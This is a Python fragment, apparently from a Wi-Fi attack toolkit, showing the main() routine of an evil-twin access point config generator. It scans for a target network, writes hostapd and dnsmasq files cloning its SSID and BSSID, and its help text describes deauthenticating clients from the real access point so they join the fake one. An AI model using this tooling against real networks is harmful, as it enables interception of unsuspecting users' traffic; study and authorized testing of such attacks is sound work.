def main():
    require_root()

    parser = argparse.ArgumentParser(
        description="Evil Twin AP config generator — educational, not automated.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "This script generates config files and instructions.\n"
            "It does NOT automatically start the AP — you do that consciously.\n\n"
            "Workflow:\n"
            "  1. Scan with --scan to pick a target\n"
            "  2. Generate config with --bssid, --ssid, --channel\n"
            "  3. Read the printed instructions\n"
            "  4. Run 04_attacks/03_deauth.py to push clients off the real AP\n"
            "  5. Watch them connect to yours"
        ),
    )
    parser.add_argument("--iface",    required=True, help="AP interface (managed mode recommended)")
    parser.add_argument("--scan",     action="store_true",
                        help="Scan for APs and pick a target interactively")
    parser.add_argument("--ssid",     default=None, help="Target SSID to clone")
    parser.add_argument("--bssid",    default=None, help="Target BSSID to spoof (optional)")
    parser.add_argument("--channel",  type=int, default=6, help="AP channel (default: 6)")
    parser.add_argument("--out-dir",  default="/tmp", help="Directory for config files (default: /tmp)")
    parser.add_argument("--i-have-authorization", action="store_true", dest="authorized",
                        help="Confirm written authorization from network owner")
    args = parser.parse_args()

    print(f"\n=== 04_attacks/05_evil_twin.py ===\n")

    # Validate output directory before doing any real work
    if not os.path.isdir(args.out_dir):
        print(f"[!] Output directory does not exist: {args.out_dir}")
        sys.exit(1)

    target = None
    if args.scan:
        # Scan doesn't need authorization — it's passive
        target = scan_targets(args.iface)
        if not target:
            print("[*] No target selected. Exiting.")
            sys.exit(0)
        ssid    = target["ssid"]
        bssid   = target["bssid"]
        channel = target["channel"] if isinstance(target["channel"], int) else args.channel
    else:
        if not args.ssid:
            print("[!] Provide --ssid (or use --scan to pick a target interactively).")
            sys.exit(1)
        ssid    = args.ssid
        bssid   = args.bssid
        channel = args.channel

    _authorization_check(args.authorized)

    # Generate config files
    hostapd_conf  = generate_hostapd_conf(args.iface, ssid, channel, bssid)
    dnsmasq_conf  = generate_dnsmasq_conf(args.iface)

    conf_path     = os.path.join(args.out_dir, "evil_twin_hostapd.conf")
    dnsmasq_path  = os.path.join(args.out_dir, "evil_twin_dnsmasq.conf")

    with open(conf_path,    "w") as fh: fh.write(hostapd_conf)
    with open(dnsmasq_path, "w") as fh: fh.write(dnsmasq_conf)

    print_run_instructions(
        iface        = args.iface,
        ssid         = ssid,
        channel      = channel,
        conf_path    = conf_path,
        dnsmasq_path = dnsmasq_path,
        mon_iface    = args.iface,
        out_dir      = args.out_dir,
    )


if __name__ == "__main__":
    main()
